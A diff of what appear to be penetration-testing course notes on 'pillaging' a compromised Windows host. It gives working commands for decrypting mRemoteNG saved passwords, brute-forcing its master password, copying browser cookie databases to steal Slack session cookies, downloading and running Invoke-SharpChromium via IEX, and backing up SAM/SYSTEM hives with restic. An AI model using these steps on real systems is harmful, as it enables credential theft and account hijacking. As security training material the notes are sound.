@@ -3581,213 +3581,358 @@ Place `.lnk` on a writable share → capture NTLMv2 via Responder/Inveigh.
 
 ---
 
-# Pilaging in Windows 
+# **Pillaging — Windows
 
-Pillaging is the phase of a penetration test where, **after gaining a foothold**, you extract as much useful information as possible from a compromised system. This information can help you:
-
-✔ escalate privileges
-✔ move laterally
-✔ access sensitive systems
-✔ achieve objectives (as defined in pre-engagement)
-
-You're essentially **harvesting credentials, tokens, configs, logs, app data, infrastructure info**, etc.
+**Goal:** Extract sensitive information from a compromised Windows host to escalate access or expand the attack surface.
 
 
-## 🗂️ **Common Pillaging Data Sources**
+### **1. What is Pillaging**
 
-### **1. Installed Applications**
+Collecting valuable information from a compromised system:
 
-Check:
+* Credentials
+* Configuration files
+* Installed apps
+* Databases
+* Cookies / tokens
+* Backups
+* Shares
+* Logs
+* Sensitive documents
 
-* `C:\Program Files`
-* `C:\Program Files (x86)`
-* Registry Uninstall keys
+Anything helping lateral movement or privilege escalation.
 
-Useful because:
+### **2. Common Data Sources**
 
-* Applications may store **saved passwords**, **API keys**, **certificates**, **connection strings**, etc.
-* Some apps have known weaknesses (example: mRemoteNG).
+* Installed applications / services
+* Web browsers
+* IM clients (Slack, Teams)
+* File Shares
+* Databases
+* Directory services (AD / Azure AD)
+* Certificate Authority
+* Deployment services
+* Source code repos
+* Virtualization platforms
+* Backups
+* Keylogging / screen capture
+* Network captures (PCAPs)
+* History files (recent docs, .doc, .xls, .pass, .kdbx, etc.)
 
-PowerShell command:
+### **3. Installed Applications Enumeration**
+
+#### **Quick enumeration (CMD)**
+
+```cmd
+dir "C:\Program Files"
+dir "C:\Program Files (x86)"
+```
+
+#### **Detailed enumeration (PowerShell via Registry)**
 
 ```powershell
-$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
-  Select-Object DisplayName,DisplayVersion,InstallLocation
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
+Select DisplayName, DisplayVersion, InstallLocation
+
 $INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
-  Select-Object DisplayName,DisplayVersion,InstallLocation
-$INSTALLED | ?{ $_.DisplayName -ne $null } | sort DisplayName | ft -AutoSize
+Select DisplayName, DisplayVersion, InstallLocation
+
+$INSTALLED | ?{ $_.DisplayName -ne $null } |
+Sort-Object DisplayName -Unique |
+Format-Table -AutoSize
 ```
 
+### **4. mRemoteNG Credential Extraction**
 
-
-### **2. Installed Services / Infrastructure**
-
-Extract valuable info from:
-
-* Webservers
-* Databases
-* Active Directory
-* File shares
-* Certificate Authority
-* Backups
-* Source Code repos
-* Virtualization platforms
-* Monitoring tools
-* Messaging systems
-
-These frequently contain:
-
-* Config files with credentials
-* Internal URLs / network mapping
-* Flat files with secrets
-* Deployment & automation credentials
-
-
-
-### **3. Sensitive Data Sources**
-
-Includes:
-
-* Keylogging output
-* Screenshots
-* Network captures
-* Previous audit reports
-* Document files (`.docx`, `.xls`, `.txt`, `.pass`, etc.)
-
-
-
-### **4. User Information**
-
-Check:
-
-* Browser credential stores
-* Application history
-* IM clients
-* Role/privilege data
-* SSH keys
-* Saved RDP connections
-
-
-## 💥 **mRemoteNG — High-Value Pillaging Target**
-
-mRemoteNG stores RDP/SSH/VNC credentials in `confCons.xml`.
-
-### **Default master password**
-
-If no custom master password is set:
+#### **Location of config file**
 
 ```
-mR3m
+%USERPROFILE%\AppData\Roaming\mRemoteNG\confCons.xml
 ```
 
-Then the encrypted password can be decrypted using a Python script:
+#### **List directory**
+
+```powershell
+ls C:\Users\<USER>\AppData\Roaming\mRemoteNG
+```
+
+#### **confCons.xml contains:**
+
+* `Password=` → AES encrypted
+* `Protected=` → encrypted master password
+
+#### **Decrypt using mremoteng_decrypt.py**
+
+**Default password (mR3m) works if user didn’t set a custom master pass.**
 
 ```bash
 python3 mremoteng_decrypt.py -s "<EncryptedPassword>"
 ```
 
-### **If a custom master password exists**
-
-You must supply:
+#### **If custom password exists**
 
 ```bash
-python3 mremoteng_decrypt.py -s "<EncryptedPassword>" -p "<master_password>"
+python3 mremoteng_decrypt.py -s "<EncryptedPassword>" -p <password>
 ```
 
-If unknown, brute-force:
+#### **Bruteforce master password**
 
 ```bash
-for pass in $(cat wordlist.txt); do
-  python3 mremoteng_decrypt.py -s "<Encrypted>" -p $pass
+for password in $(cat /usr/share/wordlists/fasttrack.txt); do
+    python3 mremoteng_decrypt.py -s "<EncryptedPassword>" -p $password 2>/dev/null
 done
 ```
 
-Once decrypted → you now have **RDP credentials**.
+### **5. Stealing IM Client Access (Slack Example)**
+
+Goal: Capture cookies to impersonate logged-in users.
 
 
-### 💬 **Stealing IM (Slack, MS Teams) Access via Cookies**
+#### **5.1 Firefox Cookie Extraction**
 
-If plaintext credentials are not available, you can steal **browser cookies** and impersonate the user.
-
-## **Firefox Cookie Extraction**
-
-Cookies stored in:
+##### **Cookie DB location**
 
 ```
-%APPDATA%\Mozilla\Firefox\Profiles\<random>.default-release\cookies.sqlite
+%APPDATA%\Mozilla\Firefox\Profiles\<RANDOM>.default-release\cookies.sqlite
 ```
 
-Copy:
+##### **Copy cookie database**
 
 ```powershell
 copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
 ```
 
-Extract Slack cookie named **`d`**:
+##### **Extract Slack cookie**
 
 ```bash
 python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
 ```
 
-Then use **Cookie-Editor** browser extension → inject cookie → refresh → logged in as victim.
+**"d" cookie = Slack auth token**
+Import via Cookie Editor → refresh → logged in.
 
 
-### 🌐 **Chromium Cookie Extraction (Chrome, Edge, Brave)**
+#### **5.2 Chromium Cookie Extraction (Chrome, Edge, Brave)**
 
-Cookies stored in:
+Chrome encrypts cookies using **DPAPI**, requiring local user context to decrypt.
 
+### **Use Invoke-SharpChromium (PowerShell)**
+
+Load script:
+
+```powershell
+IEX(New-Object Net.WebClient).DownloadString(
+'https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpChromium.ps1')
 ```
-%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
-```
 
-Cookies are encrypted with **DPAPI**, so you need to decrypt them **from the victim’s session**.
-
-Use:
+Run:
 
 ```powershell
 Invoke-SharpChromium -Command "cookies slack.com"
 ```
 
-If SharpChromium cannot find the cookie file, copy it:
+### **Fix: Chrome relocated Cookies DB**
 
-```powershell
-copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" `
-     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+SharpChromium expects:
+
+```
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
 ```
 
-Output gives Slack `d` cookie → impersonation as above.
+Actual location:
+
+```
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
+```
+
+Fix:
+
+```powershell
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+```
+
+Then rerun:
+
+```powershell
+Invoke-SharpChromium -Command "cookies slack.com"
+```
+
+#### Extracted Slack cookie example:
+
+```
+{
+ "domain": ".slack.com",
+ "name": "d",
+ "value": "xoxd-..."
+}
+```
+
+Import into Cookie Editor → authenticated as user.
 
 
-### 🧠 **Why Cookies = Account Access?**
+### **6. Where to Look for Sensitive Information**
 
-Slack uses the `d` cookie for authentication.
-If you steal it, you bypass:
+#### **High‑value file extensions**
 
-* Username/password
-* MFA
-* SSO
+```
+*.kdbx
+*.xml
+*.config
+*.ini
+*.txt
+*.xlsx
+*.docx
+*.pdf
+*.bak
+*.pass
+*.cred
+```
 
-This is **session hijacking**.
+#### **Useful command**
+
+```powershell
+gci -r -Include *.kdbx,*.xml,*.config,*.txt,*.ini -ErrorAction SilentlyContinue
+```
+
+### **7. File Shares Enumeration**
+
+#### **List shares**
+
+```cmd
+net share
+```
+
+#### **Access a share**
+
+```cmd
+\\hostname\Sharename
+```
+
+#### **Map drive**
+
+```cmd
+net use X: \\hostname\Sharename
+```
+
+### **8. Browser Credential Areas**
+
+* Chrome:
+  `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data`
+* Firefox:
+  `%APPDATA%\Mozilla\Firefox\Profiles\<profile>`
 
 
-### 🧰 **Clipboard Abuse**
+### **9. DPAPI Credential Areas**
 
-Admins using password managers often:
+* Chrome cookies
+* Chrome saved passwords
+* Wi-Fi keys
+* RDP credentials
+* Windows Credential Manager files
+* IE/Edge stored passwords
 
-* Copy/paste passwords
-* Never type them
-* Never store them in plaintext
 
-But Windows stores clipboard data in memory → can be harvested using tools like:
 
-* mimikatz (`clipboard` command)
-* powershell scripts
-* custom .NET hooks
+### **10. Backup / Log / Monitoring Data**
 
-Useful when:
+Search for:
 
-* The victim copies sensitive credentials
-* No keystroke logging is possible
+```
+C:\Backups\
+C:\Veeam\
+C:\ProgramData\Veeam\*
+C:\ProgramData\Solarwinds\
+C:\ProgramData\Zabbix\
+C:\ProgramData\Nagios\
+```
+
+Monitoring systems often contain:
+
+* SNMP strings
+* DB credentials
+* SSH keys
+* Agent configs
+
+## Backup Servers & Restic 
+
+### Server Roles
+
+* Hosts run services that may support themselves or the network.
+* Common roles: File/Print, Web/DB, CA, Source Code Management, **Backup Servers**.
+
+
+
+### Attacking Backup Servers
+
+* Backups restore data after deletion/corruption.
+* Backup accounts usually have **local admin rights**.
+* If you compromise a backup server, you can:
+
+  * Review backups
+  * Identify interesting hosts
+  * Restore sensitive data for lateral movement / privilege escalation
+
+### Restic Overview
+
+* Cross‑platform backup tool (Linux, BSD, macOS, Windows).
+* Requires a **repository** to store backups.
+* Uses `RESTIC_PASSWORD` environment variable for repo password.
+* Tool location: `C:\Windows\System32\restic.exe`.
+
+
+### Initialize Repository
+
+```
+PS C:\htb> mkdir E:\restic2; restic.exe -r E:\restic2 init
+```
+
+* Creates repo at `E:\restic2`.
+
+### Backup a Directory
+
+```
+PS C:\htb> $env:RESTIC_PASSWORD = 'Password'
+PS C:\htb> restic.exe -r E:\restic2\ backup C:\SampleFolder
+```
+
+* Snapshot ID example: `9971e881`.
+
+### Backup with VSS (for in‑use system files)
+
+```
+PS C:\htb> restic.exe -r E:\restic2\ backup C:\Windows\System32\config --use-fs-snapshot
+```
+
+* Creates a VSS snapshot.
+* May show **Access is denied** if permissions insufficient.
+* Snapshot ID example: `b0b6f4bb`.
+
+### List Snapshots
+
+```
+PS C:\htb> restic.exe -r E:\restic2\ snapshots
+```
+
+* Shows stored snapshots and paths:
+
+  * `C:\SampleFolder`
+  * `C:\Windows\System32\config`
+  * `C:\Users\jeff\Documents`
+
+### Restore a Snapshot
+
+```
+PS C:\htb> restic.exe -r E:\restic2\ restore 9971e881 --target C:\Restore
+```
+
+* Restores files to `C:\Restore`.
+
+
+
+### What to Look for in Backups
+
+* **Linux:** `/etc/shadow`, `.ssh/`, web configs, credentials.
+* **Windows:** `SAM`, `SYSTEM`, web.config, app credentials.
 
 ---
 
